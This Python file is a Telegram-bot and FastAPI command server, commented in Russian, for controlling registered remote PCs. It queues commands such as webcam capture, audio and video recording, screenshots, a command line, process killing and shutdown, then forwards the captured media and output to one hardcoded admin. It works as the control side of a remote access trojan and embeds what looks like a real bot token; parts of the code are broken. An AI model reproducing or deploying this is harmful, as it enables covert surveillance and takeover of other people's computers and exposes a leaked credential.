from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)
import sqlite3
import logging
import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from threading import Thread
import socket
import requests
import base64
import os
from datetime import datetime
import asyncio

bot_instance = None

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

DATABASE = 'pc_control.db'
API_PORT = 4443
ADMIN_IDS = [5276367440]

api = FastAPI()

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) == 0

class ServerBot:
    def __init__(self, token):
        self.token = token
        self.application = ApplicationBuilder().token(self.token).build()
        self.setup_handlers()
        self.init_db()

    def init_db(self):
        with sqlite3.connect(DATABASE) as conn:
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS devices
                        (device_id TEXT PRIMARY KEY,
                         name TEXT,
                         ip TEXT,
                         os TEXT,
                         last_seen TIMESTAMP,
                         is_online INTEGER DEFAULT 0)''')
            
            c.execute('''CREATE TABLE IF NOT EXISTS users
                        (user_id INTEGER PRIMARY KEY,
                         username TEXT)''')
            
            c.execute('''CREATE TABLE IF NOT EXISTS commands
                        (id INTEGER PRIMARY KEY AUTOINCREMENT,
                         device_id TEXT,
                         command TEXT,
                         status TEXT DEFAULT 'pending',
                         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')

    def setup_handlers(self):
        self.application.add_handlers([
            CommandHandler("start", self.start_command),
            CommandHandler("devices", self.list_devices_command),
            CallbackQueryHandler(self.callback_handler),
            MessageHandler(filters.TEXT & (~filters.COMMAND), self.text_message_handler)
        ])

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("⛔ Доступ запрещен")
            return
            
        with sqlite3.connect(DATABASE) as conn:
            conn.execute("INSERT OR IGNORE INTO users VALUES (?, ?)", 
                       (user_id, update.effective_user.username))
        
        keyboard = [
            [InlineKeyboardButton("📋 Список устройств", callback_data="list_devices")],
            [InlineKeyboardButton("🔄 Обновить статус", callback_data="refresh_devices")]
        ]
        
        await update.message.reply_text(
            "🖥️ Панель управления ПК",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    async def list_devices_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("⛔ Доступ запрещен")
            return
            
        await self.show_devices_list(update.effective_chat.id)

    async def show_devices_list(self, chat_id):
        with sqlite3.connect(DATABASE) as conn:
            c = conn.cursor()
            c.execute("SELECT device_id, name, ip, is_online FROM devices")
            devices = c.fetchall()
        
        if not devices:
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Нет подключенных устройств"
            )
            return
            
        keyboard = [
            [InlineKeyboardButton(
                f"{'🟢' if is_online else '🔴'} {name} ({ip})",
                callback_data=f"device_{device_id}"
            )]
            for device_id, name, ip, is_online in devices
        ]
        
        keyboard.append([InlineKeyboardButton("🔄 Обновить", callback_data="refresh_devices")])
        
        await self.application.bot.send_message(
            chat_id=chat_id,
            text="Список устройств:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
            
    async def callback_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        if query.data == "list_devices":
            await self.show_devices_list(query.message.chat_id)
        elif query.data == "refresh_devices":
            await self.refresh_devices(query.message.chat_id)
        elif query.data.startswith("device_"):
            await self.handle_device_action(query.message.chat_id, query.data[7:])
        elif query.data.startswith("action_"):
            parts = query.data.split("_")
            device_id = parts[1]
            action = "_".join(parts[2:])
            await self.handle_device_action_command(query.message.chat_id, device_id, action)
        elif query.data == "back_to_devices":
            await self.show_devices_list(query.message.chat_id)

    async def text_message_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            return
        # Проверяем, ожидается ли текст для show_message
        if 'show_message_device' in context.user_data:
            device_id = context.user_data.pop('show_message_device')
            text = update.message.text
            # Сохраняем команду с текстом
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command, status, created_at) VALUES (?, ?, 'pending', CURRENT_TIMESTAMP)",
                             (device_id, f"show_message:{text}"))
            await update.message.reply_text(f"Команда 'Показать сообщение' отправлена устройству. Ожидайте...")
            await self.show_devices_list(update.effective_chat.id)

    async def refresh_devices(self, chat_id):
        with sqlite3.connect(DATABASE) as conn:
            conn.execute("UPDATE devices SET is_online=0")
        await self.application.bot.send_message(
            chat_id=chat_id,
            text="🔄 Обновление статуса устройств..."
        )
        await asyncio.sleep(5)  # Ждём 5 секунд для обновления статусов
        await self.show_devices_list(chat_id)

    async def handle_device_action(self, chat_id, device_id):
        with sqlite3.connect(DATABASE) as conn:
            c = conn.cursor()
            c.execute("SELECT name, is_online FROM devices WHERE device_id=?", (device_id,))
            device = c.fetchone()
        
        if not device:
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Устройство не найдено"
            )
            return
            
        name, is_online = device
        
        if is_online:
            keyboard = [
                [InlineKeyboardButton("📷 Мультимедиа", callback_data=f"action_{device_id}_media_menu")],
                [InlineKeyboardButton("💻 Управление", callback_data=f"action_{device_id}_control_menu")],
                [InlineKeyboardButton("⚙️ Система", callback_data=f"action_{device_id}_system_menu")],
                [InlineKeyboardButton("🔙 Назад", callback_data="back_to_devices")]
            ]
            
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"Управление устройством: {name}\nСтатус: онлайн",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"Устройство {name} в настоящее время недоступно",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data="back_to_devices")]]
                ))

    async def handle_device_action_command(self, chat_id, device_id, action):
        if action == "media_menu":
            keyboard = [
                [InlineKeyboardButton("🖼️ Скриншот", callback_data=f"action_{device_id}_screenshot")],
                [InlineKeyboardButton("📸 Веб-камера", callback_data=f"action_{device_id}_webcam")],
                [InlineKeyboardButton("🎥 Запись видео (10 сек)", callback_data=f"action_{device_id}_record_video_10")],
                [InlineKeyboardButton("🎤 Запись звука (10 сек)", callback_data=f"action_{device_id}_record_audio_10")],
                [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Мультимедиа функции:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        elif action == "control_menu":
            keyboard = [
                [InlineKeyboardButton("🖱️ Клик мыши", callback_data=f"action_{device_id}_mouse_click")],
                [InlineKeyboardButton("🔣 Комбинация клавиш", callback_data=f"action_{device_id}_hotkey")],
                [InlineKeyboardButton("📺 Вывести сообщение", callback_data=f"action_{device_id}_show_message")],
                [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Функции управления:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action == "system_menu":
            keyboard = [
                [InlineKeyboardButton("💻 Командная строка", callback_data=f"action_{device_id}_cmd")],
                [InlineKeyboardButton("📜 Список процессов", callback_data=f"action_{device_id}_processes")],
                [InlineKeyboardButton("❌ Завершить процесс", callback_data=f"action_{device_id}_killprocess")],
                [InlineKeyboardButton("🔒 Заблокировать", callback_data=f"action_{device_id}_lock")],
                [InlineKeyboardButton("💤 Спящий режим", callback_data=f"action_{device_id}_sleep")],
                [InlineKeyboardButton("🔌 Выключить", callback_data=f"action_{device_id}_shutdown")],
                [InlineKeyboardButton("🔄 Перезагрузить", callback_data=f"action_{device_id}_reboot")],
                [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
            ]
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Системные функции:",
                reply_markup=InlineKeyboardMarkup(keyboard))
        elif action == "show_message":
            # Запоминаем, что ждём текст для show_message
            context = self.application.bot._get_context(chat_id)
            context.user_data['show_message_device'] = device_id
            await self.application.bot.send_message(
                chat_id=chat_id,
                text="Введите текст, который нужно вывести на экране устройства:")
        elif action in ["screenshot", "webcam", "record_video_10", "record_audio_10", 
                       "mouse_click", "hotkey",
                       "cmd", "processes", "killprocess", "lock", "sleep", "shutdown", "reboot"]:
            with sqlite3.connect(DATABASE) as conn:
                conn.execute("INSERT INTO commands (device_id, command) VALUES (?, ?)",
                           (device_id, action))
            await self.application.bot.send_message(
                chat_id=chat_id,
                text=f"Команда '{action}' отправлена устройству. Ожидайте...",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Назад", callback_data=f"device_{device_id}")]
                ])
            )

    def run(self):
        self.application.run_polling()

@api.post("/register")
async def register_device(request: Request):
    data = await request.json()
    
    with sqlite3.connect(DATABASE) as conn:
        conn.execute('''INSERT OR REPLACE INTO devices 
                      (device_id, name, ip, os, last_seen, is_online)
                      VALUES (?, ?, ?, ?, datetime('now'), 1)''',
                   (data['device_id'], data['system_info']['name'],
                    data['system_info']['ip'], data['system_info']['os']))
    
    return {"status": "success"}

@api.post("/heartbeat")
async def heartbeat(request: Request):
    data = await request.json()
    
    with sqlite3.connect(DATABASE) as conn:
        conn.execute("UPDATE devices SET last_seen=datetime('now'), is_online=1 WHERE device_id=?",
                   (data['device_id'],))
    
    return {"status": "success"}

@api.get("/commands")
async def get_commands(device_id: str):
    with sqlite3.connect(DATABASE) as conn:
        c = conn.cursor()
        c.execute("SELECT id, command FROM commands WHERE device_id=? AND status='pending'",
                 (device_id,))
        commands = [{"id": row[0], "command": row[1]} for row in c.fetchall()]
        
        if commands:
            c.execute("UPDATE commands SET status='executing' WHERE id IN ({})".format(
                ",".join(str(cmd['id']) for cmd in commands)))
    
    return {"commands": commands}

@api.post("/command_result")
async def command_result(request: Request):
    data = await request.json()
    device_id = data['device_id']
    command_id = data['command_id']
    result = data.get('result', '')
    file_type = data.get('file_type')
    file_data = data.get('file_data')
    
    if bot_instance:
        try:
            if file_type and file_data:
                file_bytes = base64.b64decode(file_data)
                if file_type == 'photo':
                    await bot_instance.application.bot.send_photo(
                        chat_id=ADMIN_IDS[0],
                        photo=file_bytes,
                        caption=f"Результат с устройства {device_id}\n\n{result}"
                    )
                elif file_type == 'video':
                    await bot_instance.application.bot.send_video(
                        chat_id=ADMIN_IDS[0],
                        video=file_bytes,
                        caption=f"Результат с устройства {device_id}\n\n{result}"
                    )
                elif file_type == 'audio':
                    await bot_instance.application.bot.send_audio(
                        chat_id=ADMIN_IDS[0],
                        audio=file_bytes,
                        caption=f"Результат с устройства {device_id}\n\n{result}"
                    )
            else:
                await bot_instance.application.bot.send_message(
                    chat_id=ADMIN_IDS[0],
                    text=f"Результат выполнения команды:\n\n{result}"
                )
        except Exception as e:
            logger.error(f"Ошибка отправки результата: {e}")
    
    with sqlite3.connect(DATABASE) as conn:
        conn.execute("UPDATE commands SET status='completed' WHERE id=?",
                   (command_id,))
    
    return {"status": "success"}

def run_api_server():
    if is_port_in_use(API_PORT):
        logger.error(f"Порт {API_PORT} уже занят!")
        return
    
    config = uvicorn.Config(
        api,
        host="0.0.0.0",
        port=API_PORT,
        log_level="info"
    )
    server = uvicorn.Server(config)
    server.run()

def main():
    try:
        external_ip = requests.get('https://api.ipify.org').text
        print(f"Ваш внешний IP: {external_ip}")
    except:
        print("Не удалось определить внешний IP")
    
    if is_port_in_use(API_PORT):
        print(f"Ошибка: Порт {API_PORT} уже используется!")
        return
    
    api_thread = Thread(target=run_api_server, daemon=True)
    api_thread.start()
    
    try:
        bot = ServerBot("8060699147:AAEawF_dYzDuEA7lqF_FHCuHsujuMwF4r8k")
        global bot_instance
        bot_instance = bot
        print(f"\nСервер запущен:")
        print(f"Локальный адрес: http://localhost:{API_PORT}")
        print(f"Внешний адрес: http://{external_ip}:{API_PORT}")
        bot.run()
    except Exception as e:
        print(f"Ошибка при запуске бота: {e}")

if __name__ == '__main__':
    main()